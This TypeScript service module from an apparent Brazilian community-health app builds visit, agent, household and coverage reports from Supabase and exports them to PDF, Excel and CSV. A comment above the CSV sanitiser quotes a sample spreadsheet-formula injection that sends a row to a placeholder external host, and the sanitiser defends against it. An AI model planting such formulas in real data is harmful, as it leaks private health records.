'use client';

import { createClient } from '@/lib/supabase/client';
import { format } from 'date-fns';
import { ptBR } from 'date-fns/locale';
import type {
  RelatorioFiltros,
  VisitaComDetalhes,
  AgenteComEstatisticas,
  ResidenciaComDetalhes,
  CoberturaMicroarea,
  FamiliaEmAtraso,
  GlobalFilters,
} from '@/types';
import { formatDataDaVisita, fimExclusivo, falhaDeConsulta } from '@/lib/utils';
import { selectVisitas } from './visitaService';
import { selectResidencias } from './familiaService';
import { buscarTudo } from '@/lib/buscarEmLotes';
import { montarPlanilha, type ColunaPlanilha, type InformacaoPlanilha } from './planilha';
import { AGENTE_COLUNAS_LISTA } from './agenteColunas';

/**
 * Gera dados de relatório de visitas com base nos filtros informados.
 */
export async function gerarRelatorioVisitas(
  filtros: RelatorioFiltros
): Promise<VisitaComDetalhes[]> {
  try {
    const supabase = createClient();

    const rows = await buscarTudo((de, ate) => {
      let query = supabase.from('visitas').select(selectVisitas(filtros));

      if (filtros.periodo_inicio) {
        query = query.gte('data_visita', filtros.periodo_inicio);
      }
      if (filtros.periodo_fim) {
        query = query.lt('data_visita', fimExclusivo(filtros.periodo_fim));
      }
      if (filtros.agente_id) {
        query = query.eq('agente_id', filtros.agente_id);
      }
      if (filtros.unidade_saude) {
        query = query.eq('agente.unidade_saude', filtros.unidade_saude);
      }
      if (filtros.bairro) {
        query = query.eq('residencia.bairro', filtros.bairro);
      }
      if (filtros.status) {
        query = query.eq('status', filtros.status);
      }

      // O id desempata visitas na mesma data, senão um lote repete ou pula linha.
      return query
        .order('data_visita', { ascending: false })
        .order('id', { ascending: true })
        .range(de, ate);
    }, 'Erro ao gerar relatório de visitas');

    return rows as unknown as VisitaComDetalhes[];
  } catch (err) {
    if (err instanceof Error) throw err;
    throw new Error('Erro inesperado ao gerar relatório de visitas');
  }
}

/**
 * Gera dados de relatório de agentes com base nos filtros informados.
 */
export async function gerarRelatorioAgentes(
  filtros: RelatorioFiltros
): Promise<AgenteComEstatisticas[]> {
  try {
    const supabase = createClient();

    let query = supabase
      .from('agentes')
      .select(AGENTE_COLUNAS_LISTA)
      .eq('ativo', true);

    if (filtros.unidade_saude) {
      query = query.eq('unidade_saude', filtros.unidade_saude);
    }

    query = query.order('nome', { ascending: true });

    const { data: agentes, error } = await query;

    if (error) {
      throw falhaDeConsulta('gerar relatório de agentes', error);
    }

    if (!agentes || agentes.length === 0) return [];

    const agenteIds = agentes.map((a) => a.id);

    const visitas = await buscarTudo((de, ate) => {
      let visitasQuery = supabase
        .from('visitas')
        .select('id, agente_id, status')
        .in('agente_id', agenteIds);

      if (filtros.periodo_inicio) {
        visitasQuery = visitasQuery.gte('data_visita', filtros.periodo_inicio);
      }
      if (filtros.periodo_fim) {
        visitasQuery = visitasQuery.lt('data_visita', fimExclusivo(filtros.periodo_fim));
      }

      return visitasQuery.order('id', { ascending: true }).range(de, ate);
    }, 'Erro ao buscar visitas dos agentes');

    const statsMap = new Map<string, { total: number; realizadas: number }>();

    for (const v of visitas) {
      const s = statsMap.get(v.agente_id) ?? { total: 0, realizadas: 0 };
      s.total++;
      if (v.status === 'realizada') s.realizadas++;
      statsMap.set(v.agente_id, s);
    }

    return agentes.map((agente) => {
      const s = statsMap.get(agente.id) ?? { total: 0, realizadas: 0 };
      return {
        ...agente,
        total_visitas: s.total,
        visitas_realizadas: s.realizadas,
        taxa_conclusao:
          s.total > 0
            ? Math.round((s.realizadas / s.total) * 10000) / 100
            : 0,
      } as AgenteComEstatisticas;
    });
  } catch (err) {
    if (err instanceof Error) throw err;
    throw new Error('Erro inesperado ao gerar relatório de agentes');
  }
}

/**
 * Gera dados de relatório de famílias com base nos filtros informados.
 */
export async function gerarRelatorioFamilias(
  filtros: RelatorioFiltros
): Promise<ResidenciaComDetalhes[]> {
  try {
    const supabase = createClient();

    const rows = await buscarTudo((de, ate) => {
      let query = supabase
        .from('residencias')
        .select(selectResidencias(filtros))
        .is('deleted_at', null);

      if (filtros.bairro) {
        query = query.eq('bairro', filtros.bairro);
      }
      if (filtros.agente_id) {
        query = query.eq('agente_id', filtros.agente_id);
      }
      if (filtros.unidade_saude) {
        query = query.eq('agente.unidade_saude', filtros.unidade_saude);
      }

      return query
        .order('logradouro', { ascending: true })
        .order('id', { ascending: true })
        .range(de, ate);
    }, 'Erro ao gerar relatório de famílias');

    return rows as unknown as ResidenciaComDetalhes[];
  } catch (err) {
    if (err instanceof Error) throw err;
    throw new Error('Erro inesperado ao gerar relatório de famílias');
  }
}

/**
 * Gera dados de relatório de cobertura por microárea.
 */
export async function gerarRelatorioCobertura(
  filtros: RelatorioFiltros
): Promise<CoberturaMicroarea[]> {
  try {
    const supabase = createClient();

    const params: Record<string, unknown> = {};
    if (filtros.unidade_saude) params.p_unidade = filtros.unidade_saude;

    const { data, error } = await supabase.rpc(
      'fn_cobertura_por_microarea',
      params
    );

    if (error) {
      throw falhaDeConsulta('gerar relatório de cobertura', error);
    }

    return (data as CoberturaMicroarea[]) ?? [];
  } catch (err) {
    if (err instanceof Error) throw err;
    throw new Error('Erro inesperado ao gerar relatório de cobertura');
  }
}

/**
 * Gera dados de relatório de famílias sem visita realizada (todas, sem corte
 * de dias). A função do banco também passa pelo teto de 1.000 linhas.
 */
export async function gerarRelatorioAtrasos(
  filtros: RelatorioFiltros
): Promise<FamiliaEmAtraso[]> {
  const supabase = createClient();
  const params: Record<string, unknown> = { p_dias: 0 };
  if (filtros.unidade_saude) params.p_unidade = filtros.unidade_saude;

  return buscarTudo<FamiliaEmAtraso>(
    (de, ate) =>
      supabase
        .rpc('fn_familias_em_atraso', params)
        .order('dias_sem_visita', { ascending: false, nullsFirst: true })
        .order('residencia_id', { ascending: true })
        .range(de, ate),
    'Erro ao gerar relatório de famílias em atraso'
  );
}

/**
 * Neutraliza injeção de fórmula em planilha.
 *
 * Excel e LibreOffice executam o conteúdo de uma célula que começa com `=`,
 * `+`, `-`, `@`, tabulação ou retorno de carro. As observações da visita são
 * texto livre digitado pelo agente em campo, então um valor como
 * `=HYPERLINK("http://fora.example/"&A1,"clique")` vazaria a linha inteira no
 * momento em que alguém da secretaria abrisse o relatório. Em sistema de
 * órgão público isso é exfiltração de dado de saúde por um clique.
 *
 * O apóstrofo faz a planilha tratar o valor como texto. Vale só para o CSV:
 * no .xlsx cada célula tem o tipo declarado (ver `planilha.ts`) e lá o
 * apóstrofo aparecia escrito na célula.
 */
function neutralizarFormula(valor: unknown): string {
  const texto = valor == null ? '' : String(valor);
  return /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
}

/**
 * Carrega o jsPDF sob demanda.
 *
 * O jsPDF, o jspdf-autotable e o xlsx somavam cerca de 300 kB no primeiro
 * carregamento da tela de relatórios, que ia a 442 kB, e nenhum deles é
 * necessário antes de a pessoa escolher o formato e clicar em gerar. Com
 * import dinâmico, quem só olha a prévia não baixa nada disso.
 */
async function carregarPdf() {
  const [{ default: jsPDF }, { default: autoTable }] = await Promise.all([
    import('jspdf'),
    import('jspdf-autotable'),
  ]);
  return { jsPDF, autoTable };
}

/**
 * Exporta dados em formato PDF e dispara o download.
 * @param dados Array de objetos com os dados
 * @param titulo Título do relatório
 * @param colunas Definição das colunas (header e key)
 */
export async function exportarPDF(
  dados: unknown[],
  titulo: string,
  colunas: { header: string; key: string }[]
): Promise<void> {
  try {
    const { jsPDF, autoTable } = await carregarPdf();
    const doc = new jsPDF();

    // Cabeçalho
    doc.setFontSize(16);
    doc.text(titulo, 14, 20);

    doc.setFontSize(10);
    doc.text(
      `Gerado em: ${format(new Date(), "dd/MM/yyyy 'às' HH:mm", { locale: ptBR })}`,
      14,
      28
    );

    // Tabela
    const headers = colunas.map((c) => c.header);
    const rows = dados.map((item) => {
      const row = item as Record<string, unknown>;
      return colunas.map((c) => {
        const value = row[c.key];
        return value != null ? String(value) : '';
      });
    });

    autoTable(doc, {
      head: [headers],
      body: rows,
      startY: 35,
      styles: {
        fontSize: 8,
        cellPadding: 3,
      },
      headStyles: {
        fillColor: [41, 128, 185],
        textColor: 255,
        fontStyle: 'bold',
      },
      alternateRowStyles: {
        fillColor: [245, 245, 245],
      },
    });

    const nomeArquivo = `${titulo.replace(/\s+/g, '_').toLowerCase()}_${format(new Date(), 'yyyyMMdd_HHmm')}.pdf`;
    doc.save(nomeArquivo);
  } catch (err) {
    throw new Error(
      `Erro ao exportar PDF: ${err instanceof Error ? err.message : 'erro desconhecido'}`
    );
  }
}

/**
 * Exporta dados em formato Excel (.xlsx) e dispara o download.
 * @param dados Array de objetos com os dados
 * @param titulo Título do relatório (usado como nome da aba e do arquivo)
 * @param colunas Definição das colunas (header e key)
 * @param informacoes Filtros aplicados, para a aba "Informações"
 */
export async function exportarExcel(
  dados: unknown[],
  titulo: string,
  colunas: ColunaPlanilha[],
  informacoes: InformacaoPlanilha[] = []
): Promise<void> {
  try {
    const XLSX = await import('xlsx');
    const workbook = montarPlanilha(
      XLSX,
      dados as Record<string, unknown>[],
      titulo,
      colunas,
      informacoes,
      format(new Date(), 'dd/MM/yyyy HH:mm')
    );

    const nomeArquivo = `${titulo.replace(/\s+/g, '_').toLowerCase()}_${format(new Date(), 'yyyyMMdd_HHmm')}.xlsx`;
    XLSX.writeFile(workbook, nomeArquivo);
  } catch (err) {
    throw new Error(
      `Erro ao exportar Excel: ${err instanceof Error ? err.message : 'erro desconhecido'}`
    );
  }
}

/**
 * Exporta dados em formato CSV e dispara o download.
 * @param dados Array de objetos com os dados
 * @param titulo Título do relatório (usado como nome do arquivo)
 * @param colunas Definição das colunas (header e key)
 */
export function exportarCSV(
  dados: unknown[],
  titulo: string,
  colunas: { header: string; key: string }[]
): void {
  try {
    const headers = colunas.map((c) => c.header);

    const rows = dados.map((item) => {
      const row = item as Record<string, unknown>;
      return colunas
        .map((c) => {
          // Neutraliza antes de escapar. O escape de vírgula e aspas não
          // impede a planilha de executar uma célula que começa com `=`:
          // são problemas diferentes e o antigo só tratava o primeiro.
          const str = neutralizarFormula(row[c.key]);
          if (str === '') return '';
          if (str.includes(',') || str.includes('"') || str.includes('\n')) {
            return `"${str.replace(/"/g, '""')}"`;
          }
          return str;
        })
        .join(',');
    });

    const csvContent = [headers.join(','), ...rows].join('\n');

    // Adiciona BOM para UTF-8 (garante acentos no Excel)
    const bom = '\uFEFF';
    const blob = new Blob([bom + csvContent], {
      type: 'text/csv;charset=utf-8;',
    });

    const nomeArquivo = `${titulo.replace(/\s+/g, '_').toLowerCase()}_${format(new Date(), 'yyyyMMdd_HHmm')}.csv`;

    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = nomeArquivo;
    link.click();
    URL.revokeObjectURL(url);
  } catch (err) {
    throw new Error(
      `Erro ao exportar CSV: ${err instanceof Error ? err.message : 'erro desconhecido'}`
    );
  }
}

type ReportType = 'visitas' | 'agentes' | 'familias' | 'cobertura' | 'atrasos';
type ExportFormat = 'pdf' | 'excel' | 'csv';

/** Os relatórios mostravam o valor do banco: `nao_encontrado`, `atencao`. */
const STATUS_VISITA: Record<string, string> = {
  agendada: 'Agendada',
  realizada: 'Realizada',
  cancelada: 'Cancelada',
  nao_encontrado: 'Não encontrado',
};

const CRITICIDADE: Record<string, string> = {
  normal: 'Normal',
  atencao: 'Atenção',
  alerta: 'Alerta',
  critico: 'Crítico',
};

function dataBR(iso: string): string {
  const [ano, mes, dia] = iso.split('-');
  return `${dia}/${mes}/${ano}`;
}

/**
 * Filtros aplicados, para a aba "Informações" da planilha.
 *
 * Sem isto, quem recebia o arquivo não sabia de que período ou de que
 * unidade eram os números.
 */
export function descreverFiltros(
  tipo: ReportType,
  filtros: RelatorioFiltros,
  linhas: Array<Record<string, unknown>>
): InformacaoPlanilha[] {
  const info: InformacaoPlanilha[] = [];
  const usaPeriodo = tipo === 'visitas' || tipo === 'agentes';

  if (usaPeriodo) {
    const { periodo_inicio: inicio, periodo_fim: fim } = filtros;
    let periodo = 'Todo o histórico';
    if (inicio && fim) periodo = `${dataBR(inicio)} a ${dataBR(fim)}`;
    else if (inicio) periodo = `A partir de ${dataBR(inicio)}`;
    else if (fim) periodo = `Até ${dataBR(fim)}`;
    info.push(['Período', periodo]);
  }
  if (filtros.unidade_saude) info.push(['Unidade de saúde', filtros.unidade_saude]);
  if (filtros.bairro && (tipo === 'visitas' || tipo === 'familias')) {
    info.push(['Bairro', filtros.bairro]);
  }
  if (filtros.status && tipo === 'visitas') {
    info.push(['Status', STATUS_VISITA[filtros.status] ?? filtros.status]);
  }
  if (filtros.agente_id && (tipo === 'visitas' || tipo === 'familias')) {
    const nome = linhas.find((l) => l['Agente'])?.['Agente'];
    info.push(['Agente', typeof nome === 'string' ? nome : 'Um agente selecionado']);
  }
  return info;
}

/**
 * Unified report generator. Fetches data, triggers file download, and returns preview rows.
 */
export async function gerarRelatorio(
  tipo: ReportType,
  formato: ExportFormat,
  filters?: GlobalFilters,
): Promise<{
  preview: { data: Array<Record<string, unknown>>; columns: string[] };
  downloadUrl?: string;
}> {
  const filtros: RelatorioFiltros = {
    tipo,
    formato,
    periodo_inicio: filters?.periodo_inicio ?? '',
    periodo_fim: filters?.periodo_fim ?? '',
    unidade_saude: filters?.unidade_saude,
    agente_id: filters?.agente_id,
    bairro: filters?.bairro,
    status: filters?.status,
  };

  // Campo sem valor vai como null. A prévia na tela já mostra null como "-",
  // e na planilha ele vira célula vazia em vez de um traço escrito.
  let data: Array<Record<string, unknown>> = [];
  let columns: string[] = [];
  let titulo = '';

  if (tipo === 'visitas') {
    titulo = 'Relatório de Visitas';
    columns = ['Data', 'Agente', 'Status', 'Logradouro', 'Bairro', 'Observações'];
    const rows = await gerarRelatorioVisitas(filtros);
    // A consulta vem da mais nova para a mais antiga por causa da paginação;
    // o relatório lê melhor em ordem cronológica.
    const cronologicas = [...rows].sort((a, b) =>
      String(a.data_visita ?? '').localeCompare(String(b.data_visita ?? ''))
    );
    data = cronologicas.map((r) => {
      const res = r.residencia as Record<string, unknown> | null | undefined;
      const ag = r.agente as Record<string, unknown> | null | undefined;
      return {
        // data_visita chega como TIMESTAMPTZ completo; somar 'T00:00:00' a ele
        // dava data inválida e o format derrubava o relatório inteiro.
        'Data': r.data_visita ? formatDataDaVisita(r.data_visita) : null,
        'Agente': ag?.nome ?? null,
        'Status': STATUS_VISITA[r.status] ?? r.status,
        'Logradouro': res?.logradouro
          ? [res.logradouro, res.numero].filter(Boolean).join(', ')
          : null,
        'Bairro': res?.bairro ?? null,
        'Observações': r.observacoes || null,
      };
    });
  } else if (tipo === 'agentes') {
    titulo = 'Relatório de Agentes';
    columns = ['Nome', 'Unidade', 'Microárea', 'Total Visitas', 'Realizadas', 'Taxa (%)'];
    const rows = await gerarRelatorioAgentes(filtros);
    data = rows.map((r) => {
      const ag = r as unknown as Record<string, unknown>;
      return {
        'Nome': r.nome,
        'Unidade': ag.unidade_saude ?? null,
        'Microárea': ag.microarea ?? null,
        'Total Visitas': r.total_visitas ?? 0,
        'Realizadas': r.visitas_realizadas ?? 0,
        'Taxa (%)': r.taxa_conclusao ?? 0,
      };
    });
  } else if (tipo === 'familias') {
    titulo = 'Relatório de Famílias';
    columns = ['Logradouro', 'Número', 'Bairro', 'Agente', 'Moradores'];
    const rows = await gerarRelatorioFamilias(filtros);
    data = rows.map((r) => {
      const res = r as unknown as Record<string, unknown>;
      const ag = r.agente as Record<string, unknown> | null | undefined;
      const moradores = Array.isArray(res.moradores) ? (res.moradores as unknown[]).length : 0;
      return {
        'Logradouro': res.logradouro ?? null,
        'Número': res.numero ?? null,
        'Bairro': res.bairro ?? null,
        'Agente': ag?.nome ?? null,
        'Moradores': moradores,
      };
    });
  } else if (tipo === 'cobertura') {
    titulo = 'Relatório de Cobertura';
    columns = ['Microárea', 'Total Famílias', 'Visitadas (30d)', 'Cobertura (%)'];
    const rows = await gerarRelatorioCobertura(filtros);
    data = rows.map((r) => ({
      'Microárea': r.microarea,
      'Total Famílias': r.total_familias,
      'Visitadas (30d)': r.familias_visitadas_30d,
      'Cobertura (%)': r.cobertura_pct,
    }));
  } else {
    // atrasos
    titulo = 'Relatório de Famílias em Atraso';
    columns = ['Família', 'Bairro', 'Agente', 'Dias s/ Visita', 'Criticidade'];
    const rows = await gerarRelatorioAtrasos(filtros);
    data = rows.map((r) => ({
      'Família': r.endereco,
      'Bairro': r.bairro ?? null,
      'Agente': r.agente_nome ?? null,
      // Sem número de dias quer dizer que a família nunca recebeu visita.
      'Dias s/ Visita': r.dias_sem_visita ?? 'Nunca visitada',
      'Criticidade': CRITICIDADE[r.nivel_criticidade] ?? r.nivel_criticidade,
    }));
  }

  const colDefs = columns.map((c) => ({ header: c, key: c }));

  if (formato === 'pdf') {
    await exportarPDF(data, titulo, colDefs);
  } else if (formato === 'excel') {
    await exportarExcel(data, titulo, colDefs, descreverFiltros(tipo, filtros, data));
  } else {
    exportarCSV(data, titulo, colDefs);
  }

  return { preview: { data, columns } };
}
